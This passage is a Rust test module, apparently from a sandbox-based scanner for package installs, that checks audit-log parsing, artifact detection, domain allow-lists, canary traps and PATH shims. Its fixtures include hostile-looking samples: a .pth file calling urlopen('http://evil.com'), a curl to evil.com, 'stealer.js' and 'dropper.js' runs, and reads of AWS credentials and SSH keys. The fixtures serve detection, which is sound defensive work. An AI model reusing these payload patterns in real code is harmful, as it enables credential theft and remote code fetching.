{"sequence":2,"event":{"type":"exec","path":"/bin/sh","argv":["sh", "-c", "whoami"]}}
"#;
        let trace = parse_nono_audit_log(jsonl);
        assert!(
            trace
                .contains("execve(\"git\", [\"git\", \"clone\", \"https://github.com/evil/repo\"]")
        );
        assert!(trace.contains("execve(\"bun\", [\"bun\", \"run\", \"stealer.js\"]"));
        assert!(trace.contains("execve(\"/bin/sh\", [\"sh\", \"-c\", \"whoami\"]"));
    }

    #[test]
    fn parse_nono_audit_log_sensitive_file_access() {
        let jsonl = r#"
{"sequence":0,"event":{"type":"file_access","path":"/home/user/.aws/credentials","decision":"allow"}}
{"sequence":1,"event":{"type":"capability_decision","path":"/home/user/.ssh/id_rsa","decision":"deny"}}
"#;
        let trace = parse_nono_audit_log(jsonl);
        assert!(trace.contains("openat(AT_FDCWD, \"/home/user/.aws/credentials\", O_RDONLY) = 3"));
        assert!(trace.contains(
            "openat(AT_FDCWD, \"/home/user/.ssh/id_rsa\", O_RDONLY) = -1 EACCES (Permission denied)"
        ));
    }

    #[test]
    fn scan_target_artifacts_finds_files_and_types() {
        let temp_dir = tempfile::tempdir().unwrap();
        let bin_dir = temp_dir.path().join("bin");
        std::fs::create_dir_all(&bin_dir).unwrap();

        let elf_path = bin_dir.join("payload");
        std::fs::write(&elf_path, b"\x7fELFfakeexecutablecontent").unwrap();

        let macho_fat_path = bin_dir.join("macho_universal_64");
        std::fs::write(&macho_fat_path, b"\xca\xfe\xba\xbfpayload64").unwrap();

        let pth_path = temp_dir.path().join("evil.pth");
        std::fs::write(
            &pth_path,
            b"import urllib\nurllib.urlopen('http://evil.com')",
        )
        .unwrap();

        #[cfg(unix)]
        {
            let symlink_path = bin_dir.join("symlink_to_external");
            let _ = std::os::unix::fs::symlink("/etc/passwd", &symlink_path);
        }

        let artifacts = scan_target_artifacts(temp_dir.path());
        assert!(artifacts.contains("/work/bin/payload"));
        assert!(artifacts.contains("ELF 64-bit LSB executable"));
        assert!(artifacts.contains("/work/bin/macho_universal_64"));
        assert!(artifacts.contains("Mach-O 64-bit arm64 executable"));
        assert!(artifacts.contains("/work/evil.pth"));
        assert!(artifacts.contains("Python script text"));
        assert!(artifacts.contains("import urllib"));
        assert!(!artifacts.contains("symlink_to_external"));
    }

    #[test]
    fn build_synthetic_dns_response_roundtrip() {
        let ip = std::net::IpAddr::V4(std::net::Ipv4Addr::new(104, 16, 2, 35));
        let packet = build_synthetic_dns_response("registry.npmjs.org", ip);
        let trace_line = format_synthetic_dns_trace_line(&packet);
        assert!(trace_line.contains("recvfrom(4, \""));
        assert!(trace_line.contains("sin_port=htons(53)"));
    }

    #[test]
    fn test_extract_host_from_url() {
        assert_eq!(
            extract_host_from_url("https://registry.npmjs.org/"),
            Some("registry.npmjs.org".to_string())
        );
        assert_eq!(
            extract_host_from_url("http://user:pass@internal-pypi.company.com:8080/simple"),
            Some("internal-pypi.company.com".to_string())
        );
        assert_eq!(
            extract_host_from_url("pypi.company.internal"),
            Some("pypi.company.internal".to_string())
        );
        assert_eq!(extract_host_from_url("invalid-no-dot"), None);
    }

    #[test]
    fn test_default_allowed_domains_for_manager() {
        let npm_domains = default_allowed_domains_for_manager("npm");
        assert!(npm_domains.contains(&"registry.npmjs.org".to_string()));
        assert!(npm_domains.contains(&"*.npmjs.org".to_string()));

        let pnpm_domains = default_allowed_domains_for_manager("pnpm");
        assert!(pnpm_domains.contains(&"registry.yarnpkg.com".to_string()));

        let py_domains = default_allowed_domains_for_manager("pip");
        assert!(py_domains.contains(&"pypi.org".to_string()));
        assert!(py_domains.contains(&"files.pythonhosted.org".to_string()));
    }

    #[test]
    fn test_discover_registry_domains_from_env() {
        let _guard = SandboxEnvVarGuard::set_many(&[
            (
                "NPM_CONFIG_REGISTRY",
                "https://artifactory.corp.internal/npm",
            ),
            ("PIP_INDEX_URL", "https://pypi.corp.internal/simple"),
            ("GYRSEEK_ALLOWED_DOMAINS", "custom-cdn.net, extra.org"),
        ]);
        let discovered = discover_registry_domains_from_env();
        assert!(discovered.contains(&"artifactory.corp.internal".to_string()));
        assert!(discovered.contains(&"pypi.corp.internal".to_string()));
        assert!(discovered.contains(&"custom-cdn.net".to_string()));
        assert!(discovered.contains(&"extra.org".to_string()));
    }

    #[test]
    fn test_extract_domains_from_nono_audit_log() {
        let jsonl = r#"
{"sequence":0,"event":{"type":"network","event":{"target":"files.pythonhosted.org","port":443,"decision":"allow"}}}
{"sequence":1,"event":{"type":"network","event":{"target":"93.184.216.34","port":443,"decision":"allow"}}}
{"sequence":2,"event":{"type":"network","event":{"target":"unix:/var/run/docker.sock","decision":"deny"}}}
{"sequence":3,"event":{"type":"network","event":{"target":"github.com","port":443,"decision":"deny"}}}
"#;
        let domains = extract_domains_from_nono_audit_log(jsonl);
        assert_eq!(domains, vec!["files.pythonhosted.org".to_string()]);
        assert!(!domains.contains(&"github.com".to_string()));
    }

    #[test]
    fn test_nono_resource_limits_on_linux() {
        let _guard = SandboxEnvVarGuard::remove_many(&[
            "GYRSEEK_MEM_LIMIT",
            "GYRSEEK_MAX_PROCESSES",
            "GYRSEEK_PIDS_LIMIT",
        ]);
        let args = nono_resource_limit_args_for_os("linux");
        assert_eq!(
            args,
            vec![
                "--memory".to_string(),
                "2g".to_string(),
                "--max-processes".to_string(),
                "256".to_string()
            ]
        );
    }

    #[test]
    fn test_nono_resource_limits_disabled_on_non_linux() {
        assert!(nono_resource_limit_args_for_os("macos").is_empty());
        assert!(nono_resource_limit_args_for_os("darwin").is_empty());
        assert!(nono_resource_limit_args_for_os("windows").is_empty());
    }

    #[test]
    fn test_nono_resource_limits_respect_env_overrides() {
        let _guard = SandboxEnvVarGuard::set_many(&[
            ("GYRSEEK_MEM_LIMIT", "1g"),
            ("GYRSEEK_MAX_PROCESSES", "128"),
        ]);
        let args = nono_resource_limit_args_for_os("linux");
        assert_eq!(
            args,
            vec![
                "--memory".to_string(),
                "1g".to_string(),
                "--max-processes".to_string(),
                "128".to_string()
            ]
        );
    }

    #[test]
    fn test_sandbox_max_processes_env_fallback() {
        let _guard = SandboxEnvVarGuard::set_many(&[
            ("GYRSEEK_MAX_PROCESSES", ""),
            ("GYRSEEK_PIDS_LIMIT", "512"),
        ]);
        assert_eq!(sandbox_max_processes(), "512");
    }

    #[test]
    fn test_nono_profile_content_on_macos() {
        let content = nono_profile_content_for_os("macos", Some("/var/folders/xx/yy/C"))
            .expect("macos profile should exist");
        assert!(content.contains("\"/tmp\""));
        assert!(content.contains("\"/private/tmp\""));
        assert!(content.contains("\"/var/folders/xx/yy/C\""));
        assert!(content.contains("\"/private/var/folders/xx/yy/C\""));
        assert!(content.contains("\"deny\""));

        let content_without_cache =
            nono_profile_content_for_os("macos", None).expect("macos profile should exist");
        assert!(content_without_cache.contains("\"/tmp\""));
        assert!(!content_without_cache.contains("var/folders"));
    }

    #[test]
    fn test_nono_profile_content_on_linux() {
        let content =
            nono_profile_content_for_os("linux", None).expect("linux profile should exist");
        assert!(content.contains("\"system_write_linux\""));
        assert!(content.contains("\"exclude\""));
        assert!(content.contains("\"/dev/null\""));
        assert!(!content.contains("\"deny\""));
    }

    #[test]
    fn test_nono_profile_content_disabled_on_other_os() {
        assert!(nono_profile_content_for_os("windows", None).is_none());
        assert!(nono_profile_content_for_os("unknown", None).is_none());
    }

    #[test]
    #[cfg(unix)]
    fn test_canary_trap_detects_read_and_clean_teardown() {
        let temp = tempfile::tempdir().unwrap();
        let work = temp.path().join("work");
        let home = temp.path().join("home");
        std::fs::create_dir_all(&work).unwrap();
        std::fs::create_dir_all(&home).unwrap();

        let trap = CanaryTrap::setup(&work, &home, "pip").expect("setup canary trap");

        let env_file = work.join(".env");
        if env_file.exists() {
            // First read
            let content1 = std::fs::read_to_string(&env_file).unwrap_or_default();
            assert!(content1.contains("KEY=gyrseek-canary-trap"));
            // Repeated read must not block
            let content2 = std::fs::read_to_string(&env_file).unwrap_or_default();
            assert!(content2.contains("KEY=gyrseek-canary-trap"));
        }

        let accessed = trap.teardown();
        assert!(accessed.contains(&"/work/.env".to_string()));
    }

    #[test]
    #[cfg(unix)]
    fn test_canary_trap_untouched_clean_teardown() {
        let temp = tempfile::tempdir().unwrap();
        let work = temp.path().join("work");
        let home = temp.path().join("home");
        std::fs::create_dir_all(&work).unwrap();
        std::fs::create_dir_all(&home).unwrap();

        let trap = CanaryTrap::setup(&work, &home, "pip").expect("setup canary trap");
        let accessed = trap.teardown();
        assert!(accessed.is_empty());
    }

    #[test]
    #[cfg(unix)]
    fn test_canary_trap_skips_npmrc_for_npm() {
        let temp = tempfile::tempdir().unwrap();
        let work = temp.path().join("work");
        let home = temp.path().join("home");
        std::fs::create_dir_all(&work).unwrap();
        std::fs::create_dir_all(&home).unwrap();

        let trap = CanaryTrap::setup(&work, &home, "npm").expect("setup canary trap");
        assert!(!work.join(".npmrc").exists());
        assert!(!home.join(".npmrc").exists());
        let accessed = trap.teardown();
        assert!(accessed.is_empty());
    }

    #[test]
    #[cfg(unix)]
    fn test_path_shims_logging_and_event_parsing() {
        let temp = tempfile::tempdir().unwrap();
        let shims = PathShims::setup(temp.path(), temp.path()).expect("setup shims");
        assert!(shims.shims_dir().join("git").exists());
        assert!(shims.shims_dir().join("bun").exists());
        assert!(shims.shims_dir().join("curl").exists());

        let output = std::process::Command::new(shims.shims_dir().join("bun"))
            .args(["run", "dropper.js", "--flag"])
            .output()
            .expect("run bun shim");
        assert_eq!(output.status.code(), Some(127));

        let events = shims.read_exec_events();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].0, "bun");
        assert_eq!(
            events[0].1,
            vec![
                "run".to_string(),
                "dropper.js".to_string(),
                "--flag".to_string()
            ]
        );
    }

    #[test]
    #[cfg(unix)]
    fn test_path_shims_shutdown_with_held_writer() {
        let temp = tempfile::tempdir().unwrap();
        let shims = PathShims::setup(temp.path(), temp.path()).expect("setup shims");
        let fifo_path = shims.fifo_path().to_path_buf();

        // Simulate a descendant process opening and holding the write end of the FIFO.
        // Retry until the worker thread has opened the read end (otherwise O_NONBLOCK fails with ENXIO).
        let c_path = std::ffi::CString::new(fifo_path.to_string_lossy().as_bytes()).unwrap();
        let mut write_fd = -1;
        for _ in 0..50 {
            write_fd = unsafe { libc::open(c_path.as_ptr(), libc::O_WRONLY | libc::O_NONBLOCK) };
            if write_fd >= 0 {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(2));
        }
        assert!(write_fd >= 0, "open write end");

        // Write an event through the held descriptor
        let msg = b"curl\0http://evil.com\0\n";
        let written =
            unsafe { libc::write(write_fd, msg.as_ptr() as *const libc::c_void, msg.len()) };
        assert_eq!(written, msg.len() as isize);

        // read_exec_events must finish promptly and read the event, despite write_fd still being held open
        let start = std::time::Instant::now();
        let events = shims.read_exec_events();
        let elapsed = start.elapsed();

        unsafe {
            libc::close(write_fd);
        }

        assert!(
            elapsed < std::time::Duration::from_millis(200),
            "must not block on held writer: elapsed {:?}",
            elapsed
        );
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].0, "curl");
        assert_eq!(events[0].1, vec!["http://evil.com".to_string()]);
    }

    #[test]
    fn test_parse_nono_diagnostics_denials() {
        let stderr_fixture = br#"
npm ERR! code {ERR_INVALID_PACKAGE_TARGET}
compiler warning: { "syntax": false }
cat: /Users/alice/.zshrc: Operation not permitted
{
  "session": {
    "exit_code": 1,
    "denials": [
      {
        "path": "/Users/alice/.zshrc",
        "access": "Read",
        "reason": "PolicyBlocked"
      }
    ],
    "violations": [
      {
        "operation": "file-read-data",
        "target": "/Users/alice/.aws/credentials"
      }
    ]
  }
}
[nono] process exited with status 1
"#;
        let denied = parse_nono_diagnostics_denials(stderr_fixture);
        assert_eq!(
            denied,
            vec![
                "/Users/alice/.aws/credentials".to_string(),
                "/Users/alice/.zshrc".to_string()
            ]
        );
    }
}
